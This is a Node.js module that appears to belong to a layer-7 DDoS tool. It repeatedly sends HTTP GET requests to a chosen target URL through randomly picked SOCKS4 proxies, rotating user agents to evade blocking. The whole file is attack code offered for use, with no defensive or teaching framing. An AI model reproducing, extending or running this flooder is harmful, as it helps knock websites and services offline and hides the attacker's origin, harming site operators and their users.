const http = require('http');
const fs = require('fs');
const { SocksClient } = require('socks');
const layer7 = require('./methods/layer7');

const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);

const userAgents = fs.readFileSync('uas.txt', 'utf8').split('\n').filter(Boolean);

async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
    return new Promise((resolve, reject) => {
        const [proxyIp, proxyPort] = proxy.split(':');
        const target = new URL(targetUrl);

        const options = {
            proxy: {
                ipaddress: proxyIp,
                port: parseInt(proxyPort),
                type: 4, 
            },
            destination: {
                host: target.hostname,
                port: target.port || 80,
            },
            command: 'connect',
            timeout: 5000, 
        };

        SocksClient.createConnection(options, (err, info) => {
            if (err) {
                console.error(`Failed to connect to ${targetUrl} via ${proxy}`);
                reject(err);
                return;
            }

            if (layer7[method]) {
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                const req = http.request({
                    host: target.hostname,
                    port: target.port || 80,
                    path: target.pathname,
                    method: 'GET', 
                    headers: {
                        'User-Agent': userAgent, 
                    },
                    socket: info.socket, 
                }, (res) => {
                    console.log(`Packet sent to ${targetUrl} via ${proxy} with method ${method}`);
                    resolve();
                });

                req.on('error', (err) => {
                    if (err.code === 'ECONNRESET') {
                        console.error(`Connection reset by ${proxy}`);
                    } else {
                        console.error(`Error with ${proxy}`);
                    }
                    reject(err);
                });

                req.end();
            } else {
                console.error(`Method ${method} not found.`);
                reject(new Error(`Method ${method} not found.`));
            }
        });
    });
}

function start(targetUrl, delay, kbSize, method) {
    setInterval(() => {
        const proxy = socks4Proxies[Math.floor(Math.random() * socks4Proxies.length)];

        sendPacket(targetUrl, proxy, delay, kbSize, method).catch((err) => {
            if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED') {
                console.error(`Connection error with ${proxy}`);
            } else {
                console.error(`Error with ${proxy}`);
            }
        });
    }, delay); 
}

module.exports = { start };
